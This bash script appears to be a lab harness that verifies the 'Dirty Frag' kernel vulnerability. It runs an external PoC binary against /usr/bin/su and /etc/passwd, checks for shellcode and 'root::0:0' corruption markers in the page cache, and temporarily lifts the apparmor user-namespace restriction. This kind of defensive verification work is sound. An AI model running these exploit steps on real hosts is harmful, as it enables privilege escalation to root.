#!/usr/bin/env bash
# Phase-4 IMPACT_VERIFIED harness for the Dirty Frag detector findings.
#
# Runs the public dirtyfrag PoC against /usr/bin/su (xfrm-ESP path) and
# /etc/passwd (rxrpc path) on the lab VM. Captures:
#   - pre-state hashes (on-disk)
#   - kernel + module info
#   - corruption evidence (page-cache content after exploit)
#   - dmesg trace
#   - post-cleanup hashes (must match pre-state — proves on-disk file
#     unchanged; corruption is page-cache-only)
#
# Output: structured JSON to /tmp/dirty-frag-evidence/result.json plus
# raw artifacts in the same directory. The harness restores the
# apparmor restriction it temporarily lifts for the xfrm path.

set -uo pipefail

EXP=/home/argus/dirty-frag/dirtyfrag/exp
EVID=/tmp/dirty-frag-evidence
mkdir -p "$EVID"
RESULT="$EVID/result.json"

log() { echo "[harness] $*" >&2; }

# Snapshot a 192-byte window starting at offset $2 of file $1, hex.
hex_window() { dd if="$1" bs=1 skip="$2" count="$3" status=none | xxd -p | tr -d '\n'; }

# --- 0. Pre-flight ---
KERN=$(uname -r)
SU_PRE=$(sha256sum /usr/bin/su | awk '{print $1}')
PASSWD_PRE=$(sha256sum /etc/passwd | awk '{print $1}')
ESP4_INFO=$(modinfo esp4 2>/dev/null | awk '/^filename:/{print $2}')
RXRPC_INFO=$(modinfo rxrpc 2>/dev/null | awk '/^filename:/{print $2}')
APPARMOR_PRE=$(sysctl -n kernel.apparmor_restrict_unprivileged_userns 2>/dev/null || echo 0)
USERNS_CLONE=$(sysctl -n kernel.unprivileged_userns_clone 2>/dev/null || echo 0)
EXP_SHA=$(sha256sum "$EXP" 2>/dev/null | awk '{print $1}')

log "kernel=$KERN exp=$EXP_SHA"
log "pre /usr/bin/su = $SU_PRE"
log "pre /etc/passwd = $PASSWD_PRE"

# --- 1. ESP path ---
ESP_RUN_OK=false
ESP_CORRUPTED=false
SU_HEX_AFTER_EXPLOIT=""
SU_HEX_AFTER_DROP=""
SU_AFTER_DROP=""
DMESG_ESP=""

# Lift apparmor restriction so the unprivileged unshare(NEWUSER) succeeds.
sudo -n sysctl -w kernel.apparmor_restrict_unprivileged_userns=0 >/dev/null 2>&1 || true
sudo -n dmesg -C >/dev/null 2>&1 || true

log "running ./exp --force-esp (xfrm-ESP path)"
# Stdin from /dev/null so the PTY bridge won't block on user input.
# Timeout protects against hangs in run_root_pty.
timeout 45 "$EXP" --force-esp -v < /dev/null > "$EVID/exp_esp.stdout" 2> "$EVID/exp_esp.stderr"
ESP_EXIT=$?
log "exp esp exit code = $ESP_EXIT"

# Corruption proof: read /usr/bin/su via page-cache-resident path
# (the exploit operated on the cached pages; subsequent cat reads them).
SU_HEX_AFTER_EXPLOIT=$(hex_window /usr/bin/su 0 192)

# Compare to expected shellcode-ELF marker (entry at offset 0x78 = "31 ff").
ENTRY_BYTES=$(echo "$SU_HEX_AFTER_EXPLOIT" | cut -c$((0x78*2+1))-$((0x78*2+4)))
if [ "$ENTRY_BYTES" = "31ff" ]; then
    ESP_CORRUPTED=true
fi

DMESG_ESP=$(sudo -n dmesg 2>/dev/null | tail -50 | tr '\n' '\\' | sed 's/"/\\"/g')

# Recover.
echo 3 | sudo -n tee /proc/sys/vm/drop_caches > /dev/null 2>&1
SU_AFTER_DROP=$(sha256sum /usr/bin/su | awk '{print $1}')
SU_HEX_AFTER_DROP=$(hex_window /usr/bin/su 0 192)
log "post-drop /usr/bin/su = $SU_AFTER_DROP (matches pre = $([ "$SU_AFTER_DROP" = "$SU_PRE" ] && echo YES || echo NO))"

# --- 2. RXRPC path ---
RXRPC_RUN_OK=false
RXRPC_CORRUPTED=false
PASSWD_HEX_AFTER_EXPLOIT=""
PASSWD_AFTER_DROP=""
DMESG_RXRPC=""

sudo -n dmesg -C >/dev/null 2>&1 || true

log "running ./exp --force-rxrpc (rxrpc path)"
timeout 60 "$EXP" --force-rxrpc -v < /dev/null > "$EVID/exp_rxrpc.stdout" 2> "$EVID/exp_rxrpc.stderr"
RXRPC_EXIT=$?
log "exp rxrpc exit code = $RXRPC_EXIT"

PASSWD_HEX_AFTER_EXPLOIT=$(hex_window /etc/passwd 0 32)
# Marker check: "root::0:0" = 726f6f743a3a303a30 (9 bytes hex = 18 chars)
PASSWD_PREFIX=$(echo "$PASSWD_HEX_AFTER_EXPLOIT" | cut -c1-18)
if [ "$PASSWD_PREFIX" = "726f6f743a3a303a30" ]; then
    RXRPC_CORRUPTED=true
fi

DMESG_RXRPC=$(sudo -n dmesg 2>/dev/null | tail -50 | tr '\n' '\\' | sed 's/"/\\"/g')

# Recover.
echo 3 | sudo -n tee /proc/sys/vm/drop_caches > /dev/null 2>&1
PASSWD_AFTER_DROP=$(sha256sum /etc/passwd | awk '{print $1}')
log "post-drop /etc/passwd = $PASSWD_AFTER_DROP (matches pre = $([ "$PASSWD_AFTER_DROP" = "$PASSWD_PRE" ] && echo YES || echo NO))"

# --- 3. Restore apparmor ---
sudo -n sysctl -w kernel.apparmor_restrict_unprivileged_userns="$APPARMOR_PRE" >/dev/null 2>&1 || true

# --- 4. Emit JSON ---
cat > "$RESULT" <<JSON
{
  "harness_version": "1.0",
  "timestamp_utc": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "host": "$(hostname)",
  "kernel": "$KERN",
  "modules": {
    "esp4": "$ESP4_INFO",
    "rxrpc": "$RXRPC_INFO"
  },
  "policy_pre": {
    "apparmor_restrict_unprivileged_userns": $APPARMOR_PRE,
    "unprivileged_userns_clone": $USERNS_CLONE
  },
  "exp_sha256": "$EXP_SHA",
  "esp": {
    "exit_code": $ESP_EXIT,
    "su_pre_sha256": "$SU_PRE",
    "su_hex_after_exploit_first192": "$SU_HEX_AFTER_EXPLOIT",
    "entry_bytes_at_0x78": "$ENTRY_BYTES",
    "page_cache_corrupted": $ESP_CORRUPTED,
    "su_post_drop_sha256": "$SU_AFTER_DROP",
    "su_hex_post_drop_first192": "$SU_HEX_AFTER_DROP",
    "on_disk_intact": $([ "$SU_AFTER_DROP" = "$SU_PRE" ] && echo true || echo false),
    "dmesg_tail": "$DMESG_ESP"
  },
  "rxrpc": {
    "exit_code": $RXRPC_EXIT,
    "passwd_pre_sha256": "$PASSWD_PRE",
    "passwd_hex_after_exploit_first32": "$PASSWD_HEX_AFTER_EXPLOIT",
    "page_cache_corrupted": $RXRPC_CORRUPTED,
    "passwd_post_drop_sha256": "$PASSWD_AFTER_DROP",
    "on_disk_intact": $([ "$PASSWD_AFTER_DROP" = "$PASSWD_PRE" ] && echo true || echo false),
    "dmesg_tail": "$DMESG_RXRPC"
  }
}
JSON

log "result -> $RESULT"
cat "$RESULT"
